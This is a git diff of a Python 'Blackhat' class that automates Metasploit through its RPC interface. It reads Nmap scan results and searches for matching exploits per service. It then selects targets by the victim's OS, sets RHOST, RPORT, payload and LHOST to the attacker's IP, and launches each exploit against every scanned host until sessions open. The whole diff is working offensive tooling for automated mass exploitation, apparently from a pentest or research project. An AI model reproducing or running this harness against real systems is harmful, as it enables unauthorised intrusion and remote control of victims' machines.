@@ -1,6 +1,7 @@
 from json_data_processing_script import *
 from metasploit_script import *
 import os
+import socket
 
 
 class Blackhat:
@@ -9,6 +10,9 @@ class Blackhat:
         self.env = Msfrpc()
         self.targets_tree = self.json_monitor.get_targets_tree()
 
+        ######################PRINT BANNER#####################################################################
+        self.env.color_monitor.print_intro_banner()
+
         ######################CONNECT YOURSELF TO MSGRPC#######################################################
         self.env.launch_metasploit()
         self.env.connection_rpc()
@@ -16,8 +20,10 @@ class Blackhat:
         ######################STORE INFORMATIONS###############################################################
         self.tree_targets = None
         self.default_tree_payload_per_exploit = None
-
-
+        self.targets_option_tree_per_exploit = None
+        self.current_targets_option_tree = None
+        self.checkmodule_option_tree_per_exploit = None
+        self.host_ip = None
 
     ####################SUB FUNCTION TO HANDLE CORRECTION AND OPTIMIZATION####################################
     #                ________
@@ -42,13 +48,14 @@ class Blackhat:
     #        .-^--r-^-.   .-^--r-^-.
     # ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     ####################SUB FUNCTION TO HANDLE CORRECTION AND OPTIMIZATION####################################
-    def correction_with_correlation_table(self, service_name):
+
+    def correction_with_correlation_table_for_service_name(self, service_name):
         '''
         Method used to make correlation between value given in entry of the method and the table defined in config.ini
         :param service_name: name of the service (string)
         :return: the correlation (string)
         '''
-        for correlation in self.json_monitor.correlation_table:
+        for correlation in self.json_monitor.correlation_table_services:
             if service_name in correlation:
                 msfcorrector = correlation.split('$')[-1]
                 return msfcorrector
@@ -69,6 +76,18 @@ class Blackhat:
                     return service_name
             service_name = service_name[0]
         return service_name
+
+    def correction_with_correlation_table_for_targets_option(self, target_name):
+        '''
+        Method used to make correlation between value given in entry of the method and the table defined in config.ini
+        :param target_name: name of the target (string)
+        :return: the correlation (string)
+        '''
+        for correlation in self.json_monitor.correlation_table_targets:
+            if target_name in correlation:
+                msfcorrector = correlation.split('$')[-1]
+                return msfcorrector
+        return target_name
 
     def look_for_repository(self, exploit):
         '''
@@ -111,11 +130,98 @@ class Blackhat:
         self.default_tree_payload_per_exploit = self.env.default_list_payload_per_exploit
 
         print(self.env.color_monitor.background_OKGREEN + "[*] Storing information in {}".format(
-            str(self.json_monitor.datapath) + '/data.json') +
+            str(self.json_monitor.datapath) + '/default_payload_tree.json') +
               self.env.color_monitor.background_ENDC)
 
         self.json_monitor.write_json_data_in_a_file(self.json_monitor.datapath + '/default_payload_tree.json',
-                                                    self.env.default_list_payload_per_exploit)
+                                                    self.default_tree_payload_per_exploit)
+
+    def get_targets_per_exploit_tree(self):
+        '''
+        Method used to create the tree for targets (per exploit)
+        :return:
+        '''
+        ####GET THE TREE####
+        self.env.get_exploits()
+        self.env.get_targets_exploit()
+        ####STORE IT########
+        self.targets_option_tree_per_exploit = self.env.targets_list_per_exploit
+
+        print(self.env.color_monitor.background_OKGREEN + "[*] Storing information in {}".format(
+            str(self.json_monitor.datapath) + '/targets_option_tree.json') +
+              self.env.color_monitor.background_ENDC)
+
+        self.json_monitor.write_json_data_in_a_file(self.json_monitor.datapath + '/targets_option_tree.json',
+                                                    self.targets_option_tree_per_exploit)
+
+    def get_default_checkmodule_per_exploit_tree(self):
+        '''
+        Method used to create the tree for checkmodule (per exploit)
+        This method is necessary due to the bad configuration of pymetasploit3
+        :return:
+        '''
+        ####GET THE TREE####
+        self.env.get_exploits()
+        self.env.get_checkmodule_exploit()
+        ####STORE IT########
+        self.checkmodule_option_tree_per_exploit = self.env.checkmodule_list_per_exploit
+
+        print(self.env.color_monitor.background_OKGREEN + "[*] Storing information in {}".format(
+            str(self.json_monitor.datapath) + '/default_checkmodule_tree.json') +
+              self.env.color_monitor.background_ENDC)
+
+        self.json_monitor.write_json_data_in_a_file(self.json_monitor.datapath + '/default_checkmodule_tree.json',
+                                                    self.checkmodule_option_tree_per_exploit)
+
+    def get_targets_option_for_target_per_exploit(self, ip):
+        '''
+        Method used to create the tree of targets_option for the target (per exploit)
+        :return:
+        '''
+        ###INITIALISATION OF THE NEW TREE###
+        tree_targets_option_for_target = {}
+        ###RETRIEVE THE TREE####
+        tree_targets_option = self.json_monitor.read_json_data_in_a_file(
+            self.json_monitor.datapath + '/targets_option_tree.json')
+        tree_target = self.json_monitor.read_json_data_in_a_file(self.json_monitor.datapath + '/targets_tree.json')
+        ###RETRIEVE OS OF THE VICTIM###
+        os = tree_target[str(ip)]["os"]
+        ###CHECK IF CORRELATION EXIST AND IF TRUE STORE IT IN THE LIST###
+        tmp = []
+        tmp.append(os)
+        correlation = self.correction_with_correlation_table_for_targets_option(os)
+        if os != correlation:
+            tmp.append(correlation)
+        ###LOOK FOR THE OS AND MAKE THE TREE FOR THE SPECIFIC TARGET RELATED TO THE IP###
+        for exploit, targets_option in tree_targets_option.items():
+            target_selected = []
+            for target_name in targets_option:
+                for os_name in tmp:
+                    if os_name in target_name.lower():
+                        target_selected.append(target_name)
+            ###IF OS NONE RELATED TARGET, LOOK IF THERE IS 'AUTO' IN TARGET###
+            if len(target_selected) == 0:
+                for target_name in targets_option:
+                    if 'auto' in target_name.lower():
+                        target_selected.append(target_name)
+            ###IF NONE OF THE PREVIOUS METHOD WORKED, RETRIEVE ALL EXPLOIT###
+            if len(target_selected) == 0:
+                target_selected = targets_option
+            ###DELETE DOUBLE VALUE DUE TO CORRELATION###
+            target_selected = list(dict.fromkeys(target_selected))
+            ###STORE IT IN THE DICT###
+            tree_targets_option_for_target[str(exploit)] = target_selected
+
+        ###STORE IN JSON FILE###
+        self.current_targets_option_tree = tree_targets_option_for_target
+
+        print(self.env.color_monitor.background_OKGREEN + "[*] Storing information in {}".format(
+            str(self.json_monitor.datapath) + '/targets_option_tree_for_' + str(ip) + '.json') +
+              self.env.color_monitor.background_ENDC)
+
+        self.json_monitor.write_json_data_in_a_file(
+            self.json_monitor.datapath + '/targets_option_tree_for_' + str(ip) + '.json',
+            self.current_targets_option_tree)
 
     def get_targets_tree(self):
         '''
@@ -164,7 +270,7 @@ class Blackhat:
                             ############################################################################################
                             search_string_for_console_cmd = self.correction_with_detection_service_name(
                                 dict_of_port['prod_name'])
-                            search_string_for_console_cmd = self.correction_with_correlation_table(
+                            search_string_for_console_cmd = self.correction_with_correlation_table_for_service_name(
                                 search_string_for_console_cmd)
 
                             prod_name_corrected = search_string_for_console_cmd
@@ -178,7 +284,7 @@ class Blackhat:
 
                             search_string_for_console_cmd += ' ' + version_troncated
                             search_string_for_console_cmd = 'search ' + search_string_for_console_cmd
-                            #############################LAUNCH THE COMMAND AND GET LIST EXPLOIT########################
+                            #############################LAUNCH THE COMMAND SEARCH IN MSF AND GET LIST EXPLOIT##########
                             exploit_list = self.env.execute_console_command(search_string_for_console_cmd)[
                                 'data'].split('\n')
                             tmp = []
@@ -264,17 +370,273 @@ class Blackhat:
         #                      b
         #                       ug
         print(self.env.color_monitor.background_OKGREEN + "[*] Storing information in {}".format(
-            str(self.json_monitor.datapath) + '/data.json') +
+            str(self.json_monitor.datapath) + '/targets_tree.json') +
               self.env.color_monitor.background_ENDC)
-        self.json_monitor.write_json_data_in_a_file(self.json_monitor.datapath + '/data.json', self.tree_targets)
+        self.json_monitor.write_json_data_in_a_file(self.json_monitor.datapath + '/targets_tree.json',
+                                                    self.tree_targets)
 
-    # def launch_exploitation(self, mode):
-    #     if mode == "test":
-    #
-    #     return 0
+    def get_existence_ia_ressources_data(self):
+        if os.path.exists(
+                os.path.join(self.json_monitor.save_path_ia_data, self.json_monitor.save_ia_data_file)) is True:
+            return True
+        else:
+            return False
+
+    def get_host_ip(self):
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        self.host_ip = s.getsockname()[0]
+        s.close()
+
+    ######################################EXPLOITATION PROCESS################################################
+    #                              888          ,e,   d8
+    #  e88~~8e  Y88b  /  888-~88e  888  e88~-_   "  _d88__
+    # d888  88b  Y88b/   888  888b 888 d888   i 888  888
+    # 8888__888   Y88b   888  8888 888 8888   | 888  888
+    # Y888    ,   /Y88b  888  888P 888 Y888   ' 888  888
+    #  "88___/   /  Y88b 888-_88"  888  "88_-~  888  "88_/
+    #                    888
+    ######################################EXPLOITATION PROCESS################################################
+
+    def launch_exploitation(self, mode):
+        ###GENERAL VARIABLE###
+        flag_ia_data_load = None
+        flag_rport_default_value_changed = None
+        ######################
+        if mode == "train":
+            # TODO
+            '''
+            create mode train
+            '''
+            a = None
+        elif mode == "test":
+            if self.get_existence_ia_ressources_data() is True:
+                # TODO
+                '''
+                load weight when IA will exist
+                '''
+                a = None
+                flag_ia_data_load = 1
+
+            # -------------------------------------------------RETRIEVE HOST IP--------------------------------------- #
+            self.get_host_ip()
+            print(self.env.color_monitor.background_OKCYAN,
+                  "--------------------------------------------------------",
+                  "[*] Host ip is set : {}".format(str(self.host_ip)),
+                  "--------------------------------------------------------",
+                  self.env.color_monitor.background_ENDC)
+            # -------------------------------------------------END HOST IP-------------------------------------------- #
+
+            # -------------------------------------------------BEGIN TREE--------------------------------------------- #
+
+            ###RETRIEVE THE TARGET TREE IF ALREADY STORED###
+            # targets tree might not be None due to the fact that it serves also for the old tree target (retrieve from nmap scan)
+            if os.path.exists(os.path.join(self.json_monitor.datapath, 'targets_tree.json')) is True:
+                self.targets_tree = self.json_monitor.read_json_data_in_a_file(
+                    self.json_monitor.datapath + '/targets_tree.json')
+            else:
+                raise Exception("No target tree were found, launch nmap module in Hacktool Box first")
+            ###RETRIEVE THE PAYLOAD TREE IF ALREADY STORED###
+            if self.default_tree_payload_per_exploit is None:
+                if os.path.exists(os.path.join(self.json_monitor.datapath, 'default_payload_tree.json')) is True:
+                    self.default_tree_payload_per_exploit = self.json_monitor.read_json_data_in_a_file(
+                        self.json_monitor.datapath +
+                        '/default_payload_tree.json')
+                else:
+                    print(self.env.color_monitor.background_WARNING +
+                          '[!!!] No default payload tree was found, creation of this feature is launched' +
+                          self.env.color_monitor.background_ENDC)
+                    self.get_default_payload_per_exploit_tree()
+            ###RETRIEVE THE CHECKMODULE TREE IF ALREADY STORED###
+            if self.checkmodule_option_tree_per_exploit is None:
+                if os.path.exists(os.path.join(self.json_monitor.datapath, 'default_checkmodule_tree.json')) is True:
+                    self.checkmodule_option_tree_per_exploit = self.json_monitor.read_json_data_in_a_file(
+                        self.json_monitor.datapath +
+                        '/default_checkmodule_tree.json')
+                else:
+                    print(self.env.color_monitor.background_WARNING +
+                          '[!!!] No default checkmodule tree was found, creation of this feature is launched' +
+                          self.env.color_monitor.background_ENDC)
+                    self.get_default_checkmodule_per_exploit_tree()
+            ###RETRIEVE THE GENERAL TARGETS OPTION TREE###
+            if self.targets_option_tree_per_exploit is None:
+                if os.path.exists(os.path.join(self.json_monitor.datapath, 'targets_option_tree.json')) is True:
+                    self.targets_option_tree_per_exploit = self.json_monitor.read_json_data_in_a_file(
+                        self.json_monitor.datapath +
+                        '/targets_option_tree.json')
+                else:
+                    print(self.env.color_monitor.background_WARNING +
+                          '[!!!] No targets option tree found, creation of this feature is launched' +
+                          self.env.color_monitor.background_ENDC)
+                    self.get_targets_per_exploit_tree()
+            # -------------------------------------------------END TREE----------------------------------------------- #
+
+            for ip in [*self.targets_tree]:
+                ###DISPLAY INFO###
+                print(self.env.color_monitor.background_OKCYAN,
+                      "--------------------------------------------------------",
+                      "[*] Target ip is set : {}".format(str(ip)),
+                      "--------------------------------------------------------",
+                      self.env.color_monitor.background_ENDC)
+                self.env.color_monitor.print_exploit_banner()
+                ###RETRIEVE THE TARGETS OPTION TREE FOR AN IP###
+                self.current_targets_option_tree = self.json_monitor.read_json_data_in_a_file(
+                    self.json_monitor.datapath +
+                    '/targets_option_tree_for_' + str(ip) + '.json')
+
+                ###EXPLORE THE TARGET TREE###
+                for port_number in [*self.targets_tree[ip]["ports"]]:
+                    for exploit in self.targets_tree[ip]["ports"][port_number]["exploit"]:
+                        # ---------------------------------USEFULL VARIABLE FOR THE USE OF EXPLOIT ------------------- #
+                        name_exploit_for_use = str(exploit).split('/')
+                        name_exploit_for_use = '/'.join(name_exploit_for_use[1:])
+                        # ---------------------------------END USEFULL VARIABLE--------------------------------------- #
+
+                        ###RUN THE EXPLOIT PART 1###------------------------------------------------------------------ #
+                        self.env.run_an_exploit(exploit)
+
+                        try:
+                            ###RETRIEVE THE REQUIRED MISSING OPTIONS###
+                            for options in self.env.current_exploit.missing_required:
+                                flag_check = None
+                                if options.lower() == 'checkmodule':
+                                    ###SET CHECKMODULE ACCORDING TO THE TREE OF CHECKMODULE EXPLOIT###
+                                    flag_check = self.env.change_option_exploit('CheckModule',
+                                                                                self.checkmodule_option_tree_per_exploit[
+                                                                                    name_exploit_for_use], 'STR')
+                                if options.lower() == 'rhosts':
+                                    ###SET RHOSTS ACCORDING TO THE TARGET TREE###
+                                    flag_check = self.env.change_option_exploit('RHOSTS', str(ip), 'STR')
+
+                                if options.lower() == 'rhost':
+                                    ###SET RHOST ACCORDING TO THE TARGET TREE###
+                                    flag_check = self.env.change_option_exploit('RHOST', str(ip), 'STR')
+
+                                if options.lower() == 'rport':
+                                    ###SET RPORT ACCORDING TO THE TARGET TREE###
+                                    flag_check = self.env.change_option_exploit('RPORT', str(port_number), 'STR')
+                                    flag_rport_default_value_changed = 1
+
+                                elif flag_check is None:
+                                    raise Exception("Can't configure correctrly the exploit : unknown required option")
+                        except Exception as e:
+                            print(self.env.color_monitor.background_FAIL +
+                                  '[x] Failed to configure exploit {} : {}'.format(str(exploit),
+                                                                                   str(e)),
+                                  self.env.color_monitor.background_ENDC)
+                        # ------------------------------------END CONF EXPLOIT PART 1--------------------------------- #
+
+                        # --------------------------------------BEGIN PAYLOAD CONF------------------------------------ #
+                        if flag_ia_data_load is None:
+                            try:
+                                ###RETRIEVE THE DEFAULT PAYLOAD AND SELECT IT###
+                                # remove the beginning 'exploit/'
+                                self.env.run_a_payload(self.default_tree_payload_per_exploit[str(name_exploit_for_use)])
+                                ###CONFIGURE IT###
+                                self.env.change_option_payload('LHOST', str(self.host_ip), 'STR')
+                            except Exception as e:
+                                print(self.env.color_monitor.background_FAIL +
+                                      '[x] Failed to configure payload for exploit {} : {}'.format(str(exploit),
+                                                                                                   str(e)),
+                                      self.env.color_monitor.background_ENDC)
+
+                        else:
+                            # TODO
+                            '''
+                            use IA weight data to determine payload
+                            '''
+                            a = None
+                        # ----------------------------------------END PAYLOAD CONF------------------------------------ #
+
+                        # --------------------------------TARGETS CONF (EXPLOIT CONF PART 2)-------------------------- #
+                        ###RETRIEVE TARGETS LIST RELATED TO THE EXPLOIT AND THE OS OF THE VICTIM###
+                        target_list = self.current_targets_option_tree[str(name_exploit_for_use)]
+
+                        for target in target_list:
+                            try:
+                                ###GET THE INDEX###
+                                index = self.targets_option_tree_per_exploit[str(name_exploit_for_use)].index(
+                                    str(target))
+                                ###################
+                                self.env.current_exploit.target = index
+                                ###EXECUTE THE EXPLOIT###------------------------------------------------------------- #
+                                json_exploit, session = self.env.execute_exploit()
+                                if json_exploit == -1:
+                                    print(self.env.color_monitor.background_FAIL +
+                                          '[x] Failed to launch exploit with target {}'.format(str(index)),
+                                          self.env.color_monitor.background_ENDC)
+                                else:
+                                    print(self.env.color_monitor.background_HEADER +
+                                          '[*] Success in using the exploit {} with the payload {} and the target {}, to the target ip {}, at the port {}'.format(
+                                              str(exploit),
+                                              str(self.default_tree_payload_per_exploit[str(name_exploit_for_use)]),
+                                              str(target),
+                                              str(ip),
+                                              str(self.env.current_exploit.runoptions['RPORT'])
+                                          ),
+                                          self.env.color_monitor.background_ENDC)
+                                    break
+                                # ----------------------------------END EXECUTE EXPLOIT------------------------------- #
+
+                                if flag_rport_default_value_changed is None and json_exploit == -1:
+                                    ###CHANGE RPORT AND RETRY THE SAME PROCESS WITH TARGET OPTION, EXECPT IF RPORT DEFAULT IS RPORT TREE###
+                                    if str(port_number) == str(self.env.current_exploit.runoptions['RPORT']):
+                                        raise Exception("RPORT default and RPORT in the target tree are the same")
+                                    #######################################################################################################
+                                    #######CHANGE RPORT######
+                                    flag_check = self.env.change_option_exploit('RPORT', str(port_number), 'INT')
+                                    #########################
+                                    ###IF RPORT NOT CHANGEABLE###
+                                    if flag_check is None:
+                                        raise Exception("RPORT not changeable ")
+                                    #############################
+                                    ###DISPLAY INFO###
+                                    print(
+                                        self.env.color_monitor.background_OKCYAN + "[*] Trying to run exploit by changing RPORT : {}".format(
+                                            str(port_number)))
+                                    ##################
+                                    for target in target_list:
+                                        ###GET THE INDEX###
+                                        index = self.targets_option_tree_per_exploit[str(name_exploit_for_use)].index(
+                                            str(target))
+                                        ###################
+                                        self.env.current_exploit.target = index
+                                        ###EXECUTE THE EXPLOIT###------------------------------------------------------------- #
+                                        json_exploit, session = self.env.execute_exploit()
+                                        if json_exploit == -1:
+                                            print(self.env.color_monitor.background_FAIL +
+                                                  '[x] Failed to get session with exploit\'s target {}'.format(
+                                                      str(index)),
+                                                  self.env.color_monitor.background_ENDC)
+                                        else:
+                                            print(self.env.color_monitor.background_OKGREEN +
+                                                  '[*] Success in using the exploit {} with the payload {} and the target {}, to the target ip {}, at the port {}'.format(
+                                                      str(exploit),
+                                                      str(self.default_tree_payload_per_exploit[str(exploit)]),
+                                                      str(target),
+                                                      str(ip),
+                                                      str(port_number)
+                                                  ),
+                                                  self.env.color_monitor.background_ENDC)
+                                            break
+                                    # ----------------------------------END EXECUTE EXPLOIT------------------------------- #
+
+                            except Exception as e:
+                                print(self.env.color_monitor.background_FAIL +
+                                      '[x] Failed to launch the exploitation : {}'.format(str(e)),
+                                      self.env.color_monitor.background_ENDC)
+
+        return self.env.client.sessions.list
 
 
 if __name__ == '__main__':
     foo = Blackhat()
     # foo.get_targets_tree()
-    foo.get_default_payload_per_exploit_tree()
+    # foo.get_default_payload_per_exploit_tree()
+    # foo.get_targets_per_exploit_tree()
+    # foo.get_targets_option_for_target_per_exploit('172.16.1.2')
+    # foo.get_default_checkmodule_per_exploit_tree()
+    sessions_list = foo.launch_exploitation(mode='test')
+    print("-------------------------------------")
+    print(sessions_list)
+    print("-------------------------------------")
